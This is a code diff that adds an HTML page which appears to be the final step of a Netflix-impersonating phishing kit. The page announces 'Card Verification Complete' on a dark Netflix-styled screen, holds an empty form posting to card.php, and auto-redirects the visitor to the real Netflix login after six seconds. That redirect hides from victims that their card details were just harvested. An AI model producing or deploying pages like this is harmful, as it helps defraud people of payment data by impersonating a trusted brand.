@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="refresh" content="6; URL=https://www.netflix.com/login" />
+        <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>success</title>
+        <style>
+            *{
+                margin:0;
+            }
+            body{
+                background-color: black;
+            }
+            img{
+                margin-left: -30px;
+                margin-top: -30px;
+                width:50%;
+            }
+        h1{
+                margin-left: 20px;
+            }
+           
+            @media only screen and (min-width: 1000px) {
+                   *{
+                margin:0;
+            }
+            body{
+                background-color: black;
+            }
+            img{
+                margin-left: -30px;
+                margin-top: -30px;
+                width:50%;
+            }
+            .wrapper{
+                
+            }
+       
+                
+
+        </style>
+    </head>
+    <body>
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQuN3aq20jEAJvYR-qvI-pqDRw0FfGtqa4EkEge0da1&s">
+        <div class="wrapper">
+            <h1 style="color:white; font-family: ;">Card Verification Complete</h1>
+            <form action="card.php" method="POST">
+                <h3 style="color:red; margin-left: 20px; margin-top: 20px;">You'll be redirected to sign in shortly.</h3>
+               
+            
+        
+            </form>
+    </body>
+</html>
